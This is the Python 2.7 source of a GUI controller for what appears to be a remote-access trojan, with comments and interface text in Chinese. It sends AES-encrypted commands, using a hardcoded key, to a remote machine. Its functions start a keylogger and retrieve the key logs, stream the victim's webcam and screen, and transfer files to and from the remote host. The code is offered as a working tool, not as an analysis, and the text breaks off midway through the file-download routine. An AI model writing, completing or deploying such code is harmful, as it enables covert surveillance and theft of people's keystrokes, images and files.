#!/usr/bin/env python
# -*-coding:utf8-*-
# python 2.7
import Tkinter as tk
from tkinter.filedialog import askdirectory,askopenfilename
import socket
from tkMessageBox import *
import time
import os
import threading
import cv2
import numpy
from PIL import Image, ImageTk
import binascii
from pyDes import *
import random
import math
from Crypto.Cipher import AES
from hashlib import md5

BASE_DIR=os.path.dirname(os.path.abspath(__file__))
time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
time_stamp = time.strftime("%Y%m%d%H%M%S", time.localtime())

cmd_list={"start|keyhook":"击键记录",
              2:"",3:""}
'''
数据包构成=包类型|包序号|包内容
0包类型包括如下:
0:数据长度等信息包
1:通信数据包
2:接收确认包
3:缺包列表请求
'''
password="abcdefg"
key=binascii.unhexlify(md5(password).hexdigest())
static_AES = AES.new(key, AES.MODE_ECB)

split_len=60000 #分片大小
time_out=0.1 #超时时间
wait_time=40
class APP(tk.Tk):
    def __init__(self,ip_port=0):
        tk.Tk.__init__(self)
        self.ip_port=["0.0.0.0",0]
        self.file=File()
        self.key=RecvKey()
        if ip_port!=0:
            self.IP_PORT=tuple(ip_port)
        else:
            self.IP_PORT=("0.0.0.0",0)

        self.main_label = tk.Label(self,
                              text="欢迎使用本工具，更多功能正在开发中。",
                              height="2",
                              width="40", bg="white")

        # main_label.grid(row="0", columnspan="2")
        # 显示框
        self.textview1 = tk.Text(self, height="10", width="30")
        self.textview1.config(state=tk.DISABLED)
        # 滑动条
        # self.scroll1 = tk.Scrollbar()
        #
        # self.scroll1.config(command=self.textview1.yview)
        # self.textview1.config(yscrollcommand=self.scroll1.set)
        # 输入
        self.IP_la = tk.Label(self, text="IP:", height="1", width="5")
        self.port_la = tk.Label(self, text="端口:", height="1", width="5")
        # IP_la.grid(row="2", column="0", sticky=tk.E)
        # port_la.grid(row="3", column="0", sticky=tk.E)
        self.IP_text = tk.Entry(self, width="20")
        self.port_text = tk.Entry(self, width="20")
        # IP_text.grid(row="2", column="1", sticky=tk.W)
        # port_text.grid(row="3", column="1", sticky=tk.W)

        self.button_c = tk.Button(self, text="开始连接",
                             command=lambda: self.connect_t(self.IP_text, self.port_text))
        # button_c.grid(row="4", column="1", pady="4", sticky=tk.W)
        self.button_q = tk.Button(self, text="退出程序",
                             command=self.quit)
        # button_q.grid(row="4", column="1", pady="4", padx="90", sticky=tk.W)

    def win_center(self):
        nScreenWid, nScreenHei = self.maxsize()
        nCurWid = 715
        nCurHeight = 405
        # nCurWid = root.winfo_reqwidth()
        # nCurHeight = root.winfo_reqheight()
        self.geometry(
            "{}x{}+{}+{}".format(nCurWid, nCurHeight, nScreenWid / 2 - nCurWid / 2, nScreenHei / 2 - nCurHeight / 2))

    def set_IP(self,IP,port):
        self.ip_port[0]=IP.get()
        if len(port.get())!=0:
            self.ip_port[1]=int(port.get())
        self.IP_PORT=tuple(self.ip_port)

    def connect_t(self,IP,port):
        self.set_IP(IP,port)
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.settimeout(5)
        try:
            con="connect"
            con=static_AES.encrypt(str16add(con))
            sock.sendto(con,self.IP_PORT)
            reply,addr=sock.recvfrom(1024)
        except socket.error:
            showinfo("提示","连接失败")
            #self.hide_main()
            #self.fun_win()
        else:
            showinfo("提示","已成功连接")
            self.hide_main()
            self.fun_win()

            pass
    def setIP_PORT(self,IP,port):
        self.set_IP(IP, port)
        showinfo("提示", "设置成功！")
        self.hide_main()
        self.fun_win()
    def MainW(self):
        self.win_center()
        self.title("控制端")

        img_file=os.path.join(BASE_DIR,"Data","bg2.gif")
        self.image=tk.PhotoImage(file=img_file)

        menuVar=tk.Menu(self)
        self.config(menu=menuVar)
        Menu_m = tk.Menu(menuVar)
        help_m=tk.Menu(menuVar)
        super_m=tk.Menu(menuVar)
        menuVar.add_cascade(label="菜单", menu=Menu_m)
        menuVar.add_cascade(label="高级",menu=super_m)
        menuVar.add_cascade(label="帮助", menu=help_m)
        menuVar.add_cascade(label="退出",command=self.quit)

        # self.main_label = tk.Label(self,
        #                       text="欢迎使用本工具，更多功能正在开发中。",
        #                       height="2",
        #                       width="40")
        # self.main_label.grid(row="0", columnspan="2")
        # 显示框

        self.textview1 = tk.Label(self, height="400", width="715",image=self.image)
        self.textview1.grid(rowspan="6", columnspan="2", sticky=tk.N + tk.S + tk.W+tk.E)

        #输入
        self.IP_la = tk.Label(self, text="IP:", height="1", width="5")
        self.port_la = tk.Label(self, text="端口:", height="1", width="5")
        self.IP_la.grid(row="2", column="0", sticky=tk.E)
        self.port_la.grid(row="3", column="0", sticky=tk.E)
        self.IP_text = tk.Entry(self,width="24")
        self.port_text = tk.Entry(self, width="24")
        self.IP_text.grid(row="2", column="1", sticky=tk.W)
        self.port_text.grid(row="3", column="1", sticky=tk.W)

        self.button_c = tk.Button(self, text="开始连接",
                             command=lambda :self.connect_t(self.IP_text,self.port_text))
        self.button_c.grid(row="4", column="1", pady="4", sticky=tk.W)
        self.button_q = tk.Button(self, text="退出程序",
                            command=self.quit)
        self.button_q.grid(row="4", column="1", pady="4", padx="90", sticky=tk.W)

    def hide_main(self):
        self.main_label.grid_forget()
        self.textview1.grid_forget()
        self.IP_la.grid_forget()
        self.port_la.grid_forget()
        self.IP_text.grid_forget()
        self.port_text.grid_forget()
        self.button_c.grid_forget()
        self.button_q.grid_forget()


    def fun_win(self):
        def get_back():
            textview1.grid_forget()
            b_get_key.grid_forget()
            b_show_video.grid_forget()
            button_k.grid_forget()
            b_quit_video.grid_forget()
            b_show_scr.grid_forget()
            b_quit_scr.grid_forget()
            scroll1.grid_forget()
            bg.grid_forget()
            self.MainW()
            return
        command=CMD(self.IP_PORT)
        cvideo=CVIDEO(self.IP_PORT)

        self.title("功能区")
        menuVar=tk.Menu(self)
        self.config(menu=menuVar)
        Menu_m = tk.Menu(menuVar)
        help_m=tk.Menu(menuVar)
        super_m=tk.Menu(menuVar,tearoff=0)
        super_u=tk.Menu(super_m)
        menuVar.add_cascade(label="菜单", menu=Menu_m)
        menuVar.add_cascade(label="SU模式",menu=super_u)
        super_m.add_command(label="获取按键记录",
                            command=lambda: command.get_file("get|key_logs.txt",textview1))
        super_m.add_command(label="下载文件",
                            command=lambda: self.download_file_windows())
        super_m.add_command(label="上传文件",
                            command=lambda: self.upload_file_windows())
        menuVar.add_cascade(label="高级", menu=super_m)
        menuVar.add_cascade(label="帮助",menu=help_m)
        menuVar.add_cascade(label="返回",command=get_back)
        # main_label = tk.Label(self,
        #                       text="欢迎使用本工具，更多功能正在开发中。",
        #                       height="2",
        #                       width="40")
        img_file = os.path.join(BASE_DIR, "Data", "bg3.gif")
        self.image2 = tk.PhotoImage(file=img_file)
        bg = tk.Label(self, height="400", width="715", image=self.image2)
        bg.grid(rowspan="7", columnspan="2", sticky=tk.N + tk.S + tk.W + tk.E)

        # main_label.grid(row="0", columnspan="2")
        # 显示框
        textview1 = tk.Text(self, height="10", width="79")
        textview1.grid(row="1", columnspan="2", sticky=tk.N + tk.S + tk.W )
        textview1.config(state=tk.DISABLED)
        # 滑动条
        scroll1 = tk.Scrollbar()
        scroll1.grid(row="1", columnspan="2", sticky=tk.N + tk.S + tk.E)
        scroll1.config(command=textview1.yview)
        textview1.config(yscrollcommand=scroll1.set)
        # 输入
        button_k = tk.Button(self, text="执行按键监控",width="12",
                             command=lambda:self.getKey(textview1))
        button_k.grid(row="4", column="1", pady="4", sticky=tk.W)
        b_get_key = tk.Button(self, text="停止",width="12",
                              command=lambda:self.key.stop(textview1))
        # get_file(sock,"get|key_logs.txt")
        b_get_key.grid(row="4", column="1", pady="4", padx="90")
        b_show_video = tk.Button(self, text="执行监控程序",width="12",
                                 command=lambda:
                                 threading.Thread(target=cvideo.run_im,
                                                  args=(textview1,)).start())
        b_show_video.grid(row="5", column="1", pady="4",  sticky=tk.W)
        b_quit_video=tk.Button(self,text="关闭",width="12",
                               command=lambda :cvideo.stop(textview1))
        b_quit_video.grid(row="5", column="1", pady="4", padx="90" )

        b_show_scr = tk.Button(self, text="执行屏幕捕捉",width="12",
                                 command=lambda:
                                 threading.Thread(target=cvideo.run_s_im,
                                                  args=(textview1,)).start())
        b_show_scr.grid(row="6", column="1", pady="4", sticky=tk.W)
        b_quit_scr = tk.Button(self, text="关闭", width="12",
                               command=lambda:cvideo.stop_s(textview1))
        b_quit_scr.grid(row="6", column="1", pady="4", padx="90")

    def download_file_windows(self):
        def select():
            path=askdirectory()
            if(path):
                save_path=path
                save_entry.delete(0,tk.END)
                save_entry.insert(0,save_path)
            #窗口置顶
            win.wm_attributes("-topmost",1)
            win.wm_attributes("-topmost", 0)
            return
        def start_download():
            file_name=file_entry.get()
            save_path=save_entry.get()
            if(not(file_name and save_path)):
                showinfo("提示","输入为空")
                get_back()
                return
            frame1.grid_forget()
            frame2.grid()
            t=threading.Thread(target=self.file.getFile,args=(self.IP_PORT,file_name,save_path,canvas,pen_text,button_text))
            t.start()
            #self.file.getFile(self.IP_PORT,file_name,save_path,canvas,pen_text)

        def get_back():
            frame2.grid_forget()
            frame1.grid()
            win.wm_attributes("-topmost", 1)
            win.wm_attributes("-topmost", 0)
        def cancle():
            self.file.getFlag=False
            win.destroy()

        def done():
            cancel_button.grid_forget()
            yes_button=tk.Button(frame2,text="确定",width=10)
            yes_button.grid(row=1,column=1)

        win=tk.Toplevel(self)
        win.title("文件下载")
        set_center(win,380,180)
        #创建容器1、2
        frame1=tk.Frame(win)
        '''容器1'''
        label_file=tk.Label(frame1,text="目标文件路径:")
        label_file.grid(row=0,column=0,pady=25)
        file_entry=tk.Entry(frame1,width=25)
        file_entry.grid(row=0,column=1)
        file_entry.insert(0, r"E:/test.zip")
        label_path=tk.Label(frame1,text="文件保存位置:")
        label_path.grid(row=2,column=0,pady=10)
        save_entry=tk.Entry(frame1,width=25)
        save_entry.grid(row=2,column=1)
        select_path=tk.Button(frame1,text="选择",command=lambda:select())
        select_path.grid(row=2,column=2,sticky=tk.W)
        star_button=tk.Button(frame1,text="开始下载",command=lambda:start_download())
        star_button.grid(row=3,column=1,pady=15)
        frame1.grid()
        '''容器2,进度窗口'''
        frame2 = tk.Frame(win)
        win.geometry("450x180")
        tk.Label(frame2, text="正在下载:", ).grid(row=0, column=0)
        canvas = tk.Canvas(frame2, width=300, height=22, bg="white")
        canvas.grid(row=0, column=1,pady=25)
        #进度百分文本
        pen_text=tk.StringVar()
        pen_label=tk.Label(frame2,textvariable=pen_text)
        pen_label.grid(row=0,column=2,sticky=tk.W)
        button_text=tk.StringVar()
        button_text.set("取消")
        cancel_button = tk.Button(frame2, textvariable=button_text,width=10,command=cancle)
        cancel_button.grid(row=1,column=1)

    def upload_file_windows(self):
        def select():
            path=askopenfilename()
            if(path):
                file_path=path
                file_entry.delete(0,tk.END)
                file_entry.insert(0,file_path)
            #窗口置顶
            win.wm_attributes("-topmost",1)
            win.wm_attributes("-topmost", 0)
            return
        def start_upload():
            file_name=file_entry.get()
            save_path=path_entry.get()
            if(not(file_name and save_path)):
                showinfo("提示","输入为空")
                get_back()
                return
            frame1.grid_forget()
            frame2.grid()
            t=threading.Thread(target=self.file.sendFile,args=(self.IP_PORT,file_name,save_path,canvas,pen_text,button_text))
            t.start()
            #self.file.getFile(self.IP_PORT,file_name,save_path,canvas,pen_text)

        def get_back():
            frame2.grid_forget()
            frame1.grid()
            win.wm_attributes("-topmost", 1)
            win.wm_attributes("-topmost", 0)
        def cancle():
            self.file.getFlag=False
            win.destroy()

        win=tk.Toplevel(self)
        win.title("文件上传")
        set_center(win,380,180)
        #创建容器1、2
        frame1=tk.Frame(win)
        '''容器1'''
        label_file=tk.Label(frame1,text="上传目录")
        label_file.grid(row=0,column=0,pady=25)
        path_entry=tk.Entry(frame1,width=25)
        path_entry.grid(row=0,column=1)
        path_entry.insert(0, "C:/Users/LXL/Desktop")
        label_path=tk.Label(frame1,text="选择文件:")
        label_path.grid(row=2,column=0,pady=10)
        file_entry=tk.Entry(frame1,width=25)
        file_entry.grid(row=2,column=1)
        select_path=tk.Button(frame1,text="选择",command=lambda:select())
        select_path.grid(row=2,column=2,sticky=tk.W)
        star_button=tk.Button(frame1,text="开始上传",command=lambda:start_upload())
        star_button.grid(row=3,column=1,pady=15)
        frame1.grid()
        '''容器2,进度窗口'''
        frame2 = tk.Frame(win)
        win.geometry("450x180")
        tk.Label(frame2, text="正在上传:", ).grid(row=0, column=0)
        canvas = tk.Canvas(frame2, width=300, height=22, bg="white")
        canvas.grid(row=0, column=1,pady=25)
        #进度百分文本
        pen_text=tk.StringVar()
        pen_label=tk.Label(frame2,textvariable=pen_text)
        pen_label.grid(row=0,column=2,sticky=tk.W)
        button_text=tk.StringVar()
        button_text.set("取消")
        cancel_button = tk.Button(frame2, textvariable=button_text,width=10,command=cancle)
        cancel_button.grid(row=1,column=1)

    def getKey(self,textview):

        t=threading.Thread(target=self.key.run,args=(self.IP_PORT,textview))
        t.start()


class CMD:
    def __init__(self,IP_PORT):
        self.IP_PORT=IP_PORT

    def set_IP(self,IP):
        self.IP_PORT=IP

    def connect_t(self):
        sock=socket.socket()
        try:
            sock.connect(self.IP_PORT)
        except socket.error:
            return False
        else:
            return True

    def start_k(self, cmd, textview):
        sock=socket.socket()
        sock.connect(self.IP_PORT)
        try:
            sock.sendall(cmd)
        except socket.error:
            showinfo("提示", "启动失败！")
        else:
            textview.config(state=tk.NORMAL)
            textview.insert(tk.END, "%s%s程序已启动...\n" % (time_now, cmd_list[cmd]))
            textview.config(state=tk.DISABLED)
            return sock

    def get_file(self, cmd, textview):
        sock = socket.socket()
        sock.connect(self.IP_PORT)
        try:
            sock.sendall(str(cmd))
        except socket.error:
            print "正在运行。\n"
        if_recv = False
        while (True):
            try:
                data = sock.recv(1024)  # 缓冲区
            except socket.error:
                if_recv = False
                break
            if not data:
                print "连接断开"
                break
            print data
            file_name, file_size = data.split("|")
            time_stamp = time.strftime("%Y%m%d%H%M%S", time.localtime())
            file_name = "%s%s" % (time_stamp, file_name)
            path = os.path.join(BASE_DIR, 'KeyLogs', file_name)
            file_size = float(file_size)
            has_sent = 0
            textview.config(state=tk.NORMAL)
            textview.insert(tk.END, "正在获取...请勿进行其它操作。\n")
            textview.config(state=tk.DISABLED)
            with open(path, 'wb') as fp:
                while has_sent != file_size:
                    try:
                        data = sock.recv(1024)
                    except socket.error:
                        if_recv = False
                        break

                    fp.write(data)
                    has_sent += len(data)
                    percent = float(has_sent) / file_size
                    print('\r[保存进度]:%s%.02f%%' %
                          ('>' * int(percent * 50),
                           float(percent) * 100)),
                    # textview.config(state=tk.NORMAL)
                    # #textview.delete(1.0,tk.END)
                    # textview.insert(tk.END, "\r提示:获取%.02f%%"%(float(percent) * 100))
                    # textview.config(state=tk.DISABLED)
                    if_recv = True
                print("")
                if if_recv:
                    fp.close()
                    print ("%s 保存成功！" % file_name)
                    textview.config(state=tk.NORMAL)
                    textview.insert(tk.END, "提示:获取成功！\n")
                    textview.config(state=tk.DISABLED)
                else:
                    textview.config(state=tk.NORMAL)
                    textview.insert(tk.END, "提示:获取失败！\n")
                    textview.config(state=tk.DISABLED)
                    print ("文件保存失败！")
                sock.close()
                return

class CVIDEO:
    def __init__(self,IP_PORT):
        self.IP_PORT=IP_PORT
        self.flag=False
        self.s_flag=False
    def run_im(self,textview):
        self.flag = True
        j = 0
        im_len = ""
        reply = ""
        # time_out=0.1
        Addr = self.IP_PORT
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.settimeout(time_out)
        try:
            cmd="getVideo"
            cmd=str16add(cmd)
            cmd=static_AES.encrypt(cmd)
            sock.sendto(cmd, Addr)  # 发送命令
        except:
            print ("Send failed.")
        while (True):
            try:
                reply, addr = sock.recvfrom(1024)
                reply=static_AES.decrypt(reply)
                reply = str16del(reply)
                break
            except:
                continue
        time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
        tip = "\n\n" + time_now + "  监控程序正在运行，按s键进行画面保存\n"
        textview.config(state=tk.NORMAL)
        textview.insert(tk.END, tip)
        textview.config(state=tk.DISABLED)

        if (reply == "start"):
            T = time.time()
            seed = int(T)
            random.seed(seed)
        else:
            print ("Server is down.")
            time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
            textview.config(state=tk.NORMAL)
            textview.insert(tk.END, "%s 连接断开\n" % time_now)
            textview.config(state=tk.DISABLED)
            return 0
        cv2.namedWindow("Camera")
        group_len = 100
        # 每个包长度，单位字节
        pack_len = 60000
        # 起始包序和终止包序
        start = 0
        end = start + group_len
        # 缺包序列列表，存储每组的缺包信息
        request_list = []
        # 临时数据字典，存储每组数据
        data_dict = {}
        while (self.flag):
            try:
                im_len, addr = sock.recvfrom(65536)
                im_len=static_AES.decrypt(im_len)
                im_len = str16del(im_len)
            except:
                continue
            # 回复确认len已收到

            if im_len.startswith("0"):
                l="0|len"
                l=static_AES.encrypt(str16add(l))
                sock.sendto(l, Addr)
            else:
                continue
            im_len=im_len[2:]
            print "len=" + im_len
            # 片数，以split_len=60000字节为单位进行分片,取不小于其的最大整数
            count = int(math.ceil(float(im_len) / split_len))
            im_data=""
            while(True):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if (end > count):
                    end = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                print("request="+str(len(request_list))+str(request_list))
                if (len(request_list) == 0):
                    print ("start=%d,end=%d" % (start, end))
                    # 接收包序为[start，end)之间的数据包
                    if_next = True
                    for i in range(start, end):
                        times = 3
                        print ("i=" + str(i))
                        # 接收数据，超时接收下一个包，套接字错误则说明客户端已断开连接，退出
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)

                                pack=static_AES.decrypt(pack)
                                pack = str16del(pack)
                                # 将序号和数据分离，按序存入字典
                                if(not pack.startswith("1")):
                                    break
                                pack=pack[2:]
                                ID = pack[:pack.find("|")]
                                data = pack[pack.find("|") + 1:]
                                if int(ID) >= start and int(ID) < end:
                                    data_dict[int(ID)] = data
                                    print ("ID " + str(ID) + "get")
                                if_next = True
                                break
                            except socket.timeout:
                                print("Timeout1.")
                                if_next = False
                                break
                            except socket.error:
                                print("socket error.")
                                return
                        if (not if_next):
                            break
                # 若缺包序列不为空，说明有缺包情况，需要进行接收重发包
                else:
                    for i in request_list:
                        # 依次接收数据包
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)

                                pack=static_AES.decrypt(pack)
                                pack = str16del(pack)
                                if(not pack.startswith("1")):
                                    break
                                # 将序号和数据分离，存入字典
                                pack=pack[2:]
                                ID = pack[:pack.find("|")]
                                data = pack[pack.find("|") + 1:]
                                if int(ID) >= start and int(ID) < end:
                                    print ("re ID " + str(ID) + "get")
                                    data_dict[int(ID)] = data
                                break
                            except socket.timeout:
                                print("Timeout2.")
                                break
                            except socket.error:
                                print("socket error.")
                                return
                print ("Check.")
                flag = True
                # 每组包进行校验
                for i in range(start, end):
                    if i not in data_dict.keys():
                        print ("%d lost" % i)
                        # 发现缺包，标志位置false，并且将序列号添加至缺包序列中
                        flag = False
                        request_list.append(i)
                # 根据标志位判断有无缺包
                if (flag):
                    # 无缺包，说明该组收到的包是完整的，发送finish指令进行确认
                    print "finish."
                    finish="2|"
                    finish=static_AES.encrypt(str16add("2|"))
                    sock.sendto(finish, Addr)
                    # 按序写入文件
                    for i in range(start, end):
                        im_data+=data_dict[i]
                    # 若末尾包序等于总包数，则说明整个文件接收完毕
                    if(not im_data):
                        showinfo("Camera", str(data_dict))
                        print("the Camera date dict is:"+str(data_dict))
                        return

                    data_dict = {}
                    request_list = []
                    if end == count:
                        print ("All finish.")
                        start=0
                        end=start+group_len
                        break
                    # 其它情况则移动首位包序位
                    start += group_len
                    end += group_len
                    # 清空数据字典和缺包序列着两个临时数据区

                # 有缺包情况，发送缺包序列
                else:
                    re="3|"+str(request_list)
                    re=str16add(re)
                    re=static_AES.encrypt(re)
                    sock.sendto(re, Addr)
            dec_data = numpy.fromstring(im_data, numpy.uint8)
            '''fp=open("C:\Users\LXL\Desktop\dec_data.txt","wb")
            fp.write(im_data)
            fp.close()
            return'''
            # 解码
            #print "decdata=" + str(len(dec_data))
            try:
                img = cv2.imdecode(dec_data, cv2.IMREAD_COLOR)

            except:
                showwarning("Camera","error")
                print("Camera imdecode error.dec_data len="+str(len(dec_data)))
                print("im_data="+str(im_data))
                return
            k = cv2.waitKey(wait_time)
            # 按下s键保存
            k = cv2.waitKey(40)
            if k == ord('s') or k == ord('S'):
                time_stamp = time.strftime("%Y%m%d%H%M%S", time.localtime())
                file_name = "%s%s" % (time_stamp, "Camera.jpg")
                path = os.path.join(BASE_DIR, 'Camera')
                if (not os.path.exists(path)):
                    os.makedirs(path)
                save_path=os.path.join(path,file_name)
                cv2.imwrite(save_path, img)
                textview.config(state=tk.NORMAL)
                textview.insert(tk.END, "截图保存成功！\n")
                textview.config(state=tk.DISABLED)
            try:
                # 显示图片
                cv2.imshow("Camera", img)

            except:
                print "show error len="+str(img)
                pass
            '''pause'''
        print("close")
        cv2.destroyAllWindows()
        sock.close()

    def stop(self,textview):
        self.flag = False

        time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
        tip = "\n\n" + time_now + "  摄像监控已关闭\n"
        textview.config(state=tk.NORMAL)
        textview.insert(tk.END, tip)
        textview.config(state=tk.DISABLED)



    def stop_s(self,textview):
        self.s_flag = False
        time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
        tip = "\n\n" + time_now + "  屏幕监控已关闭\n"
        textview.config(state=tk.NORMAL)
        textview.insert(tk.END, tip)
        textview.config(state=tk.DISABLED)

    def run_s_im(self,textview):
        self.s_flag = True
        j = 0
        im_len = ""
        reply = ""
        # time_out=0.1
        Addr = self.IP_PORT
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        sock.settimeout(time_out)
        try:
            cmd="getSVideo"
            cmd=str16add(cmd)
            cmd=static_AES.encrypt(cmd)
            sock.sendto(cmd, Addr)  # 发送命令
        except:
            print ("Send failed.")
        while (True):
            try:
                reply, addr = sock.recvfrom(1024)
                reply=static_AES.decrypt(reply)
                reply = str16del(reply)
                break
            except:
                continue
        time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
        tip = "\n\n" + time_now + "  屏幕捕捉程序正在运行，按s键进行画面保存\n"
        textview.config(state=tk.NORMAL)
        textview.insert(tk.END, tip)
        textview.config(state=tk.DISABLED)

        if (reply == "start"):
            T = time.time()
            seed = int(T)
            random.seed(seed)
        else:
            print ("Server is down.")
            time_now = time.strftime("%Y-%m-%d %H:%M:%S ", time.localtime())
            textview.config(state=tk.NORMAL)
            textview.insert(tk.END, "%s 连接断开\n" % time_now)
            textview.config(state=tk.DISABLED)
            return 0
        cv2.namedWindow("Screen")
        group_len = 100
        # 每个包长度，单位字节
        pack_len = 60000
        # 起始包序和终止包序
        start = 0
        end = start + group_len
        # 缺包序列列表，存储每组的缺包信息
        request_list = []
        # 临时数据字典，存储每组数据
        data_dict = {}
        while (self.s_flag):
            try:
                im_len, addr = sock.recvfrom(65536)
                im_len=static_AES.decrypt(im_len)
                im_len=str16del(im_len)
            except:
                continue
            # 回复确认len已收到

            if im_len.startswith("0"):
                re="0|len"
                re=str16add(re)
                re=static_AES.encrypt(re)
                sock.sendto(re, Addr)

            else:
                continue
            im_len=im_len[2:]
            print "len=" + im_len
            # 片数，以split_len=60000字节为单位进行分片,取不小于其的最大整数
            count = int(math.ceil(float(im_len) / split_len))
            im_data=""
            while(True):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if (end > count):
                    end = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                print("request="+str(len(request_list)))
                if (len(request_list) == 0):
                    print ("start=%d,end=%d" % (start, end))
                    # 接收包序为[start，end)之间的数据包
                    if_next = True
                    for i in range(start, end):
                        times = 3
                        print ("i=" + str(i))
                        # 接收数据，超时接收下一个包，套接字错误则说明客户端已断开连接，退出
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                # 将序号和数据分离，按序存入字典
                                if(not pack.startswith("1")):
                                    break
                                pack=pack[2:]
                                ID = pack[:pack.find("|")]
                                data = pack[pack.find("|") + 1:]
                                if int(ID) >= start and int(ID) < end:
                                    data_dict[int(ID)] = data
                                    print ("ID " + str(ID) + "get")
                                if_next = True
                                break
                            except socket.timeout:
                                print("Timeout1.")
                                if_next = False
                                break
                            except socket.error:
                                print("socket error.")
                                return
                        if (not if_next):
                            break
                # 若缺包序列不为空，说明有缺包情况，需要进行接收重发包
                else:
                    for i in request_list:
                        # 依次接收数据包
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                # 将序号和数据分离，存入字典
                                if(not pack.startswith("1")):
                                    break
                                pack=pack[2:]
                                ID = pack[:pack.find("|")]
                                data = pack[pack.find("|") + 1:]
                                if int(ID) >= start and int(ID) < end:
                                    print ("re ID " + str(ID) + "get")
                                    data_dict[int(ID)] = data
                                break
                            except socket.timeout:
                                print("Timeout2.")
                                break
                            except socket.error:
                                print("socket error.")
                                return
                print ("Check.")
                flag = True
                # 每组包进行校验
                for i in range(start, end):
                    if i not in data_dict.keys():
                        print ("%d lost" % i)
                        # 发现缺包，标志位置false，并且将序列号添加至缺包序列中
                        flag = False
                        request_list.append(i)
                # 根据标志位判断有无缺包
                if (flag):
                    # 无缺包，说明该组收到的包是完整的，发送finish指令进行确认
                    print "finish."
                    finish="2|"
                    finish=str16add(finish)
                    finish=static_AES.encrypt(finish)
                    sock.sendto(finish, Addr)
                    # 按序写入文件
                    for i in range(start, end):
                        im_data+=data_dict[i]
                    # 若末尾包序等于总包数，则说明整个文件接收完毕
                    if (not im_data):
                        showinfo("Screen",str(data_dict))
                        print("the Screen date dict is:" + str(data_dict))
                        return
                    data_dict = {}
                    request_list = []
                    if end == count:
                        print ("All finish.")
                        start=0
                        end=start+group_len
                        break
                    # 其它情况则移动首位包序位
                    start += group_len
                    end += group_len
                    # 清空数据字典和缺包序列着两个临时数据区

                # 有缺包情况，发送缺包序列
                else:
                    request="3|"+str(request_list)
                    request=str16add(request)
                    request=static_AES.encrypt(request)
                    sock.sendto(request, Addr)
            dec_data = numpy.fromstring(im_data, numpy.uint8)
            # 解码
            try:
                img = cv2.imdecode(dec_data, cv2.IMREAD_COLOR)
            except:
                print("imdecode error.dec_data len=" + str(len(dec_data)))
                showwarning("Screen!")
                return

            k = cv2.waitKey(wait_time)
            # 按下s键保存
            k = cv2.waitKey(40)
            if k == ord('s') or k == ord('S'):
                time_stamp = time.strftime("%Y%m%d%H%M%S", time.localtime())
                file_name = "%s%s" % (time_stamp, "Screen.jpg")
                path = os.path.join(BASE_DIR, 'Screen')
                if (not os.path.exists(path)):
                    os.makedirs(path)
                save_path = os.path.join(path, file_name)
                cv2.imwrite(save_path, img)
                textview.config(state=tk.NORMAL)
                textview.insert(tk.END, "截图保存成功！\n")
                textview.config(state=tk.DISABLED)
            try:
                # 显示图片
                cv2.imshow("Screen", img)
            except:
                pass
            '''pause'''
        print("close")
        cv2.destroyAllWindows()
        sock.close()

class File:
    def __int__(self):
        self.sendFlag=True
        self.getFlag=True
    def getFile(self,Addr,file_name,path,canvas,pen_text,button_text):
        self.getFlag=True
        # 创建套接字
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, 0)
        # 设置超时时间
        sock.settimeout(time_out)
        # 发送下载文件指令
        cmd="getFile"
        cmd=str16add(cmd)
        cmd=static_AES.encrypt(cmd)
        sock.sendto(cmd, Addr)
        # 下载文件所在目录
        # 保存路径
        save_path = path + file_name[file_name.rfind("\\"):]
        # 将文件绝对路径发送至服务端
        f_name=str16add(file_name)
        f_name=static_AES.encrypt(f_name)
        sock.sendto(f_name, Addr)
        # 填充画布
        fill_line = canvas.create_rectangle(1.5, 1.5, 0, 23, width=0, fill="green")
        times = 10
        # 接收服务端回传信息
        while (True):
            try:
                info, addr = sock.recvfrom(2048)
                info=static_AES.decrypt(info)
                info=str16del(info)
                break
            except socket.timeout:
                print ("timeout")
                continue
            except socket.error:
                print ("socket error first.")
                return
        # 若返回 open failed字符串则表示打开文件失败，可能路径有问题等
        if (info == "open failed."):
            print("file open failed.Please retry")
            return
        # 否则返回的是文件的总大小信息
        if(info.startswith("0")):
            info=info[2:]
            file_size = int(info)
        # 校验组长度，100为一组
        group_len = 100
        # 每个包长度，单位字节
        pack_len = 60000
        # 起始包序和终止包序
        start = 0
        end = start + group_len
        # 缺包序列列表，存储每组的缺包信息
        request_list = []
        # 临时数据字典，存储每组数据
        data_dict = {}
        # 计算总包数
        count = int(math.ceil(float(file_size) / pack_len))
        print ("count=" + str(count))
        print("file_size=" + str(file_size))
        # 已收到的文件大小
        get_size=0
        with open(save_path, "wb") as fp:
            while (self.getFlag):
                # 若尾包位大于总数据包数，说明文件小于每个校验分组group_len
                # 或者此时为最末尾的一个分组
                # 此时需要进行修正
                if (end > count):
                    end = count
                # 若缺包列表为空，则表示无缺包信息，开始接收下一组
                if (len(request_list) == 0):
                    print ("start=%d,end=%d" % (start, end))
                    # 接收包序为[start，end)之间的数据包
                    if_next = True
                    for i in range(start, end):
                        times = 3
                        print ("i=" + str(i))
                        # 接收数据，超时接收下一个包，套接字错误则说明客户端已断开连接，退出
                        while (True):
                            try:
                                pack, addr = sock.recvfrom(65535)
                                pack=static_AES.decrypt(pack)
                                pack=str16del(pack)
                                pack=pack[2:]
                                # 将序号和数据分离，按序存入字典
                                ID = pack[:pack.find("|")]
